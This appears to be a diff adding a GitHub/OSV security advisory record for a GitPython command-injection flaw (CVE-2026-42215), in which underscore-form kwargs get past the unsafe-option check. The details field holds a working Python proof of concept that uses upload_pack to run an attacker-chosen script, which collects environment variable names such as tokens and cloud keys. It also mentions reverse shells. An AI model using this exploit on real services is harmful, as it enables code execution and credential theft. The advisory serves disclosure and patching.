@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-rpm5-65cw-6hj4",
+  "modified": "2026-05-05T16:10:42.684386Z",
+  "published": "2026-04-25T23:42:16Z",
+  "aliases": [
+    "CVE-2026-42215"
+  ],
+  "related": [
+    "CGA-4vjv-wcm3-r5v5"
+  ],
+  "summary": "GitPython has Command Injection via Git options bypass",
+  "details": "### Summary\nGitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.\n\n### Details\nGitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:\n\n- `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe.\n- `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.\n\nThe vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:\n\n- `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390`\n- `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071`\n- `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125`\n- `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`\n\nThat validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.\n\nLater, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:\n\n- `upload_pack=...` becomes `--upload-pack=...`\n- `receive_pack=...` becomes `--receive-pack=...`\n\nBecause the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.\n\nIn practice:\n\n- `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError`\n- `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution\n\nThe same bypass works for:\n\n```python\nRepo.clone_from(origin, out, upload_pack=helper)\nrepo.remote(\"origin\").fetch(upload_pack=helper)\nrepo.remote(\"origin\").pull(upload_pack=helper)\nrepo.remote(\"origin\").push(receive_pack=helper)\n```\n\nThis does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.\n\nExisting tests cover the hyphenated form, not the vulnerable underscore form. For example:\n\n- `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}`\n- `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`\n\nThose tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.\n\n### PoC\n1. Create and activate a virtual environment in the repository root:\n\n```bash\npython3 -m venv .venv-sec\n.venv-sec/bin/pip install setuptools gitdb\nsource ./.venv-sec/bin/activate\n```\n\n2. make a new python file and put the following in there, then run it:\n\n```python\nimport os\nimport stat\nimport subprocess\nimport tempfile\n\nfrom git import Repo\nfrom git.exc import UnsafeOptionError\n\n# Setup: create isolated repositories so the PoC uses a normal fetch flow.\nbase = tempfile.mkdtemp(prefix=\"gp-poc-risk-\")\norigin = os.path.join(base, \"origin.git\")\nproducer = os.path.join(base, \"producer\")\nvictim = os.path.join(base, \"victim\")\nproof = os.path.join(base, \"proof.txt\")\nwrapper = os.path.join(base, \"wrapper.sh\")\n\n# Setup: this wrapper is just to demo things you can do, not required for the exploit to work\n# you could also do something like an SSH reverse shell, really anything\nwith open(wrapper, \"w\") as f:\n    f.write(f\"\"\"#!/bin/sh\n{{\n  echo \"code_exec=1\"\n  echo \"whoami=$(id)\"\n  echo \"cwd=$(pwd)\"\n  echo \"uname=$(uname -a)\"\n  printf 'argv='; printf '\u003c%s\u003e' \"$@\"; echo\n  env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=\u003credacted\u003e/' || true\n}} \u003e '{proof}'\nexec git-upload-pack \"$@\"\n\"\"\")\nos.chmod(wrapper, stat.S_IRWXU)\n\nsubprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nwith open(os.path.join(producer, \"README\"), \"w\") as f:\n    f.write(\"x\")\n\nsubprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL)\nsubprocess.run(\n    [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],\n    check=True,\n    stdout=subprocess.DEVNULL,\n)\nsubprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\nsubprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\nrepo = Repo(victim)\nremote = repo.remote(\"origin\")\n\n# the literal Git option name is properly blocked.\ntry:\n    remote.fetch(**{\"upload-pack\": wrapper})\n    print(\"control=unexpected_success\")\nexcept UnsafeOptionError:\n    print(\"control=blocked\")\n\n# this is the actual vulnerability\n# you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact\n# if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created\nremote.fetch(upload_pack=wrapper)\n\n# Proof: the helper ran as the GitPython host process.\nprint(\"proof_exists\", os.path.exists(proof), proof)\nprint(open(proof).read())\n```\n\n3. Expected result:\n\n- The script prints `control=blocked`\n- The script prints `proof_exists True ...`\n- The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names\n\nExample output:\n\n```bash\nGitPython % python3 test.py\ncontrol=blocked\nproof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt\ncode_exec=1\nwhoami=uid=501(wes) gid=20(staff) \u003credacted\u003e\ncwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim\nuname=Darwin  \u003credacted\u003e Darwin Kernel Version  \u003credacted\u003e; root:xnu-11417. \u003credacted\u003e\nargv=\u003c/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git\u003e\nUSER=\u003credacted\u003e\nSSH_AUTH_SOCK=\u003credacted\u003e\nPATH=\u003credacted\u003e\nHOME=\u003credacted\u003e\n```\n\nThis PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.\n\n### Impact\nWho is impacted:\n- Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior\n- Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs`\n- CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )\n\nWhat the attacker needs to control:\n\n- A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`\n\nFrom a severity perspective, this could lead to\n- Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process\n- Modification of repositories, build outputs, or release artifacts\n- Lateral movement from CI/CD workers or automation hosts\n- Full compromise of the worker or service process handling repository operations\n\nThe highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "gitpython",
+        "purl": "pkg:pypi/gitpython"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.1.30"
+            },
+            {
+              "fixed": "3.1.47"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.1.30",
+        "3.1.31",
+        "3.1.32",
+        "3.1.33",
+        "3.1.34",
+        "3.1.35",
+        "3.1.36",
+        "3.1.37",
+        "3.1.38",
+        "3.1.40",
+        "3.1.41",
+        "3.1.42",
+        "3.1.43",
+        "3.1.44",
+        "3.1.45",
+        "3.1.46"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-rpm5-65cw-6hj4/GHSA-rpm5-65cw-6hj4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rpm5-65cw-6hj4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gitpython-developers/GitPython"
+    }
+  ]
+}
